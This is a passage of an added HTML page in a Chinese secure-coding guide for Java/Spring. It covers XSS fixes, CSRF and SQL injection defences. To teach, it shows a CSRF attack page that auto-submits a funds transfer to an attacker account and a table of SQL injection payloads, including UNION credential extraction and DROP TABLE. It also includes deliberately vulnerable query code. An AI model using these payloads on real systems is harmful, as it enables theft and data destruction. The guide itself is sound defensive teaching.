+public String search(@RequestParam String query, Model model) {
+    // 输入验证（可根据需要扩展）
+    if (query.length() > 100) {
+        query = query.substring(0, 100); // 限制长度
+    }
+    // 使用Thymeleaf的默认转义机制
+    model.addAttribute("searchQuery", query);
+    // ...执行搜索逻辑
+    return "searchResults";
+}</code></pre>
+                </div>
+
+                <p>修复后的模板文件:</p>
+                <div class="code-example">
+                  <pre><code class="language-html">&lt;!-- 正确：使用 th:text 而不是 th:utext 自动转义用户输入 --&gt;
+&lt;div&gt;
+    您搜索的是: &lt;span th:text="${searchQuery}"&gt;&lt;/span&gt;
+&lt;/div&gt;</code></pre>
+                </div>
+
+                <h4>使用Spring Security防护XSS</h4>
+                <p>在Spring Boot应用中配置内容安全策略(CSP):</p>
+                <div class="code-example">
+                  <pre><code class="language-java">@Configuration
+@EnableWebSecurity
+public class SecurityConfig extends WebSecurityConfigurerAdapter {
+
+    @Override
+    protected void configure(HttpSecurity http) throws Exception {
+        http
+            // 其他安全配置...
+            .headers()
+                .contentSecurityPolicy("default-src 'self'; script-src 'self' https://trusted-cdn.com; " +
+                                      "style-src 'self' https://trusted-cdn.com; img-src 'self' data:; " +
+                                      "connect-src 'self'; font-src 'self'; object-src 'none'; " +
+                                      "media-src 'self'; frame-src 'none';")
+                .and()
+                .xssProtection()
+                .block(true);
+    }
+}</code></pre>
+                </div>
+
+                <div class="tip-box">
+                  <p><strong>防御最佳实践：</strong>采用"纵深防御"策略—输入验证、输出编码、CSP和其他安全头部、框架自动保护机制等多层次防护措施共同使用。</p>
+                </div>
+
+                <h4>使用OWASP Java Encoder防御XSS</h4>
+                <p>添加OWASP Java Encoder依赖:</p>
+                <div class="code-example">
+                  <pre><code class="language-xml">&lt;dependency&gt;
+    &lt;groupId&gt;org.owasp.encoder&lt;/groupId&gt;
+    &lt;artifactId&gt;encoder&lt;/artifactId&gt;
+    &lt;version&gt;1.2.3&lt;/version&gt;
+&lt;/dependency&gt;</code></pre>
+                </div>
+
+                <p>在代码中使用编码器:</p>
+                <div class="code-example">
+                  <pre><code class="language-java">import org.owasp.encoder.Encode;
+
+@GetMapping("/profile")
+@ResponseBody
+public String displayUserProfile(@RequestParam String username) {
+    User user = userService.findByUsername(username);
+    
+    // 根据上下文使用适当的编码方法
+    String htmlContent = "&lt;div class='profile'&gt;" +
+                         "&lt;h2&gt;用户信息: " + Encode.forHtml(user.getUsername()) + "&lt;/h2&gt;" +
+                         "&lt;script&gt;var userId = '" + Encode.forJavaScript(user.getId()) + "';&lt;/script&gt;" +
+                         "&lt;a href='" + Encode.forHtmlAttribute(user.getWebsite()) + "'&gt;个人网站&lt;/a&gt;" +
+                         "&lt;/div&gt;";
+    
+    return htmlContent;
+}</code></pre>
+                </div>
+              </section>
+
+              <!-- 2.8 跨站请求伪造 (CSRF) -->
+              <section id="csrf">
+                <h3>2.8 跨站请求伪造 (CSRF)</h3>
+                
+                <p>跨站请求伪造（Cross-Site Request Forgery，简称CSRF）是一种攻击，强制已认证用户在不知情的情况下执行不需要的操作。CSRF攻击通常依赖于用户在目标系统中已认证的状态（如保存的Cookie）。</p>
+
+                <div class="warning-box">
+                  <p>CSRF攻击能够绕过同源策略，因为它们从受害者的浏览器发送请求，而浏览器会自动包含与目标站点相关的所有凭证（如Cookie）。</p>
+                </div>
+                
+                <h4>CSRF攻击工作原理</h4>
+                <p>典型的CSRF攻击流程:</p>
+                <ol>
+                  <li>用户登录合法网站A并获得认证（Cookie）</li>
+                  <li>认证不过期的情况下，用户访问恶意网站B</li>
+                  <li>恶意网站B包含可以向网站A发送请求的代码</li>
+                  <li>用户的浏览器执行该代码，向网站A发送请求（自动包含网站A的Cookie）</li>
+                  <li>网站A将请求视为合法用户的操作并执行</li>
+                </ol>
+
+                <div class="diagram-container">
+                  <img src="../images/csrf-attack.png" alt="CSRF攻击流程图" class="diagram">
+                  <p class="diagram-caption">CSRF攻击流程示意图</p>
+                </div>
+
+                <h4>漏洞示例</h4>
+                <p>一个缺乏CSRF保护的转账接口:</p>
+                <div class="code-example">
+                  <pre><code class="language-java">@Controller
+public class TransferController {
+
+    @PostMapping("/transfer")
+    public String transferFunds(
+            @RequestParam String toAccount, 
+            @RequestParam BigDecimal amount) {
+        
+        // 获取当前用户
+        UserDetails user = (UserDetails) SecurityContextHolder.getContext()
+                             .getAuthentication().getPrincipal();
+        
+        // 执行转账操作
+        accountService.transfer(user.getUsername(), toAccount, amount);
+        
+        return "redirect:/transfer/success";
+    }
+}</code></pre>
+                </div>
+
+                <p>恶意网站上的HTML可能是:</p>
+                <div class="code-example">
+                  <pre><code class="language-html">&lt;!-- 受害者访问此页面后会自动提交表单 --&gt;
+&lt;html&gt;
+&lt;body&gt;
+  &lt;h1&gt;赢取免费奖品!&lt;/h1&gt;
+  &lt;form id="transfer-form" action="https://bank.example.com/transfer" method="POST"&gt;
+    &lt;input type="hidden" name="toAccount" value="attacker-account" /&gt;
+    &lt;input type="hidden" name="amount" value="1000.00" /&gt;
+  &lt;/form&gt;
+  &lt;script&gt;
+    document.getElementById("transfer-form").submit();
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre>
+                </div>
+
+                <h4>CSRF防护措施</h4>
+                <ol>
+                  <li><strong>使用CSRF令牌</strong> - 在表单中包含服务器生成的、不可预测的令牌，服务器验证每个请求中的令牌。</li>
+                  <li><strong>检查Referer头</strong> - 验证请求的来源，但不应作为唯一防御手段。</li>
+                  <li><strong>使用SameSite Cookie属性</strong> - 设置Cookie的SameSite属性为Strict或Lax，限制跨站请求附带Cookie。</li>
+                  <li><strong>要求重新认证</strong> - 对敏感操作要求用户重新验证身份。</li>
+                  <li><strong>使用自定义请求头</strong> - 对AJAX请求添加自定义头，跨域请求无法添加这些头。</li>
+                </ol>
+
+                <h4>使用Spring Security防护CSRF</h4>
+                <p>Spring Security默认开启CSRF保护。以下是配置示例:</p>
+                <div class="code-example">
+                  <pre><code class="language-java">@Configuration
+@EnableWebSecurity
+public class SecurityConfig extends WebSecurityConfigurerAdapter {
+
+    @Override
+    protected void configure(HttpSecurity http) throws Exception {
+        http
+            .csrf() // 默认启用CSRF保护
+                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
+                // 使用cookie存储CSRF令牌，允许JS读取以便在AJAX请求中使用
+            .and()
+            // 其他安全配置...
+    }
+}</code></pre>
+                </div>
+
+                <p>在Thymeleaf模板中使用CSRF令牌:</p>
+                <div class="code-example">
+                  <pre><code class="language-html">&lt;form th:action="@{/transfer}" method="post"&gt;
+    &lt;!-- CSRF令牌会自动添加 --&gt;
+    &lt;input type="text" name="toAccount" /&gt;
+    &lt;input type="number" name="amount" /&gt;
+    &lt;button type="submit"&gt;转账&lt;/button&gt;
+&lt;/form&gt;</code></pre>
+                </div>
+
+                <p>在AJAX请求中使用CSRF令牌:</p>
+                <div class="code-example">
+                  <pre><code class="language-javascript">// 获取CSRF令牌
+const csrfToken = document.querySelector('meta[name="_csrf"]').getAttribute('content');
+const csrfHeader = document.querySelector('meta[name="_csrf_header"]').getAttribute('content');
+
+// 使用fetch API发送请求
+fetch('/api/transfer', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+        [csrfHeader]: csrfToken  // 添加CSRF令牌到头部
+    },
+    body: JSON.stringify({
+        toAccount: 'recipient',
+        amount: 500
+    })
+});</code></pre>
+                </div>
+
+                <div class="tip-box">
+                  <p><strong>何时禁用CSRF保护：</strong>只有在创建无状态API（使用JWT等）且不依赖于Cookie进行认证的情况下才考虑禁用CSRF保护。在这种情况下，确保实施其他安全措施，如严格的CORS策略。</p>
+                </div>
+
+                <h4>SameSite Cookie配置</h4>
+                <p>在Spring Boot中配置Cookie的SameSite属性:</p>
+                <div class="code-example">
+                  <pre><code class="language-java">@Configuration
+public class SessionConfig {
+
+    @Bean
+    public CookieSerializer cookieSerializer() {
+        DefaultCookieSerializer serializer = new DefaultCookieSerializer();
+        serializer.setSameSite("Lax"); // 可选值: None, Lax, Strict
+        serializer.setUseSecureCookie(true); // 需要HTTPS
+        return serializer;
+    }
+
+    @Bean
+    public ServletContextInitializer servletContextInitializer() {
+        return servletContext -> {
+            servletContext.getSessionCookieConfig().setSecure(true);
+            servletContext.getSessionCookieConfig().setHttpOnly(true);
+        };
+    }
+}</code></pre>
+                </div>
+              </section>
+
+              <!-- 2.9 SQL注入 -->
+              <section id="sql-injection">
+                <h3>2.9 SQL注入</h3>
+                
+                <p>SQL注入是一种代码注入技术，攻击者通过在用户输入中插入SQL代码，使应用程序执行非预期的数据库操作。这种攻击可能导致数据泄露、数据损坏，甚至系统接管。</p>
+
+                <div class="warning-box">
+                  <p>SQL注入仍然是OWASP Top 10中的高风险漏洞，尽管防御技术已广为人知，但许多应用程序仍然受到影响。</p>
+                </div>
+                
+                <h4>SQL注入类型</h4>
+                <table class="comparison-table">
+                  <tr>
+                    <th>类型</th>
+                    <th>描述</th>
+                    <th>示例</th>
+                  </tr>
+                  <tr>
+                    <td>经典SQL注入</td>
+                    <td>直接在SQL查询中插入恶意代码</td>
+                    <td><code>' OR '1'='1</code></td>
+                  </tr>
+                  <tr>
+                    <td>盲注SQL注入</td>
+                    <td>通过推断响应(如返回值、时间延迟)提取数据</td>
+                    <td><code>' OR (SELECT CASE WHEN (username='admin') THEN sleep(5) ELSE 0 END)--</code></td>
+                  </tr>
+                  <tr>
+                    <td>UNION SQL注入</td>
+                    <td>使用UNION运算符合并多个SELECT语句的结果</td>
+                    <td><code>' UNION SELECT username, password FROM users--</code></td>
+                  </tr>
+                  <tr>
+                    <td>批处理SQL注入</td>
+                    <td>使用分号分隔执行多条SQL语句</td>
+                    <td><code>'; DROP TABLE users--</code></td>
+                  </tr>
+                </table>
+
+                <h4>漏洞示例</h4>
+                <p>易受攻击的Java代码示例:</p>
+                <div class="code-example">
+                  <pre><code class="language-java">// 不安全的代码 - 易受SQL注入攻击
+public User findUserByUsername(String username) {
+    Connection conn = dataSource.getConnection();
+    
+    // 危险：直接拼接用户输入到SQL查询
+    String sql = "SELECT * FROM users WHERE username = '" + username + "'";
+    
+    Statement stmt = conn.createStatement();
+    ResultSet rs = stmt.executeQuery(sql);
+    
+    if (rs.next()) {
+        return new User(
+            rs.getLong("id"),
+            rs.getString("username"),
+            rs.getString("email")
+        );
+    }
+    return null;
+}</code></pre>
+                </div>
+
+                <p>如果攻击者输入 <code>' OR '1'='1</code> 作为用户名, 实际执行的SQL将是:</p>
+                <div class="code-example">
+                  <pre><code class="language-sql">SELECT * FROM users WHERE username = '' OR '1'='1'</code></pre>
+                </div>
+                <p>这将返回所有用户记录，因为条件 <code>'1'='1'</code> 永远为真。</p>
+
+                <h4>防御SQL注入的最佳实践</h4>
+                <ol>
+                  <li><strong>使用参数化查询/预处理语句</strong> - 最重要的防御措施，确保SQL代码和数据分离。</li>
+                  <li><strong>使用ORM框架</strong> - 如Hibernate、JPA等提供的查询API通常内置参数化功能。</li>
+                  <li><strong>输入验证</strong> - 验证输入数据的类型、长度、格式和范围。</li>
+                  <li><strong>最小权限原则</strong> - 数据库用户应只拥有执行必要操作的最小权限。</li>
+                  <li><strong>使用存储过程</strong> - 正确实现的存储过程可以减少SQL注入风险。</li>
+                  <li><strong>避免显示详细错误信息</strong> - 不要向用户展示数据库错误详情。</li>
+                </ol>
+
+                <h4>使用参数化查询</h4>
+                <p>修复后的安全代码示例:</p>
+                <div class="code-example">
+                  <pre><code class="language-java">// 安全的代码 - 使用参数化查询
+public User findUserByUsername(String username) {
+    String sql = "SELECT * FROM users WHERE username = ?";
+    
+    try (Connection conn = dataSource.getConnection();
+         PreparedStatement pstmt = conn.prepareStatement(sql)) {
+        
+        // 安全：使用参数化查询，参数值由JDBC驱动处理
+        pstmt.setString(1, username);
+        
+        try (ResultSet rs = pstmt.executeQuery()) {
+            if (rs.next()) {
+                return new User(
+                    rs.getLong("id"),
+                    rs.getString("username"),
+                    rs.getString("email")
+                );
+            }
+            return null;
+        }
+    }
+}</code></pre>
+                </div>
+
+                <h4>使用JPA/Hibernate</h4>
+                <p>通过JPA实现安全查询:</p>
+                <div class="code-example">
+                  <pre><code class="language-java">@Repository
+public class UserRepository {
+    
+    @PersistenceContext
+    private EntityManager entityManager;
+    
+    public User findByUsername(String username) {
+        // 使用JPA的参数化查询
+        return entityManager.createQuery(
+                "SELECT u FROM User u WHERE u.username = :username", User.class)
+            .setParameter("username", username)
+            .getSingleResult();
+    }
+}</code></pre>
+                </div>
+
+                <p>使用Spring Data JPA:</p>
+                <div class="code-example">
+                  <pre><code class="language-java">public interface UserRepository extends JpaRepository<User, Long> {
+    // Spring Data自动生成安全的查询实现
+    User findByUsername(String username);
+    
+    // 对于复杂查询，可以使用@Query
+    @Query("SELECT u FROM User u WHERE u.email = :email")
+    User findByEmail(@Param("email") String email);
+}</code></pre>
+                </div>
+
+                <h4>使用MyBatis的SQL注入防护</h4>
+                <p>MyBatis配置:</p>
+                <div class="code-example">
+                  <pre><code class="language-xml">&lt;!-- UserMapper.xml --&gt;
+&lt;mapper namespace="com.example.mapper.UserMapper"&gt;
+    &lt;select id="findByUsername" resultType="User"&gt;
+        SELECT * FROM users WHERE username = #{username}
+        &lt;!-- #{username} 表示使用参数化查询，是安全的 --&gt;
+        &lt;!-- ${username} 表示字符串替换，容易导致SQL注入，应避免使用 --&gt;
+    &lt;/select&gt;
+&lt;/mapper&gt;</code></pre>
+                </div>
+
+                <div class="tip-box">
+                  <p><strong>MyBatis参数标记:</strong> 在MyBatis中，使用 <code>#{parameter}</code> 会进行参数化查询，而 <code>${parameter}</code> 会进行直接字符串替换。除非确实需要动态构建SQL结构（如表名、排序字段），否则始终使用 <code>#{parameter}</code>。</p>
+                </div>
+
+                <h4>处理动态SQL时的安全考虑</h4>
+                <p>有时需要动态构建SQL查询（如动态排序字段或表名），这种情况下:</p>
+                <ol>
+                  <li>对动态SQL部分使用白名单验证</li>
+                  <li>避免使用用户提供的未验证值</li>
+                </ol>
+
+                <div class="code-example">
+                  <pre><code class="language-java">// 安全地处理动态排序
+public List<Product> findProductsSorted(String sortColumn, String sortOrder) {
+    // 白名单验证
+    List<String> allowedColumns = Arrays.asList("name", "price", "created_at");
+    if (!allowedColumns.contains(sortColumn)) {
+        sortColumn = "created_at"; // 默认排序字段
+    }
+    
+    // 验证排序方向
+    if (!"ASC".equalsIgnoreCase(sortOrder) && !"DESC".equalsIgnoreCase(sortOrder)) {
+        sortOrder = "DESC"; // 默认排序方向
+    }
+    
+    String sql = "SELECT * FROM products ORDER BY " + sortColumn + " " + sortOrder;
+    // 此处使用验证过的值构建SQL是安全的
+    
+    try (Connection conn = dataSource.getConnection();
+         Statement stmt = conn.createStatement();
+         ResultSet rs = stmt.executeQuery(sql)) {
+        
+        // 处理结果集...
+    }
+}</code></pre>
+                </div>
+
+                <h4>SQL注入防御检查清单</h4>
+                <ul class="checklist">
+                  <li>所有数据库查询都使用参数化查询</li>
+                  <li>使用安全的ORM/框架功能</li>
+                  <li>实施严格的输入验证</li>
+                  <li>为数据库连接应用最小权限原则</li>
+                  <li>使用Web应用防火墙作为附加防御层</li>
+                  <li>定期进行安全审计和渗透测试</li>
+                  <li>监控异常的数据库查询</li>
+                </ul>
+              </section>
+        </section>
+    </div>
+</body>
+</html> 
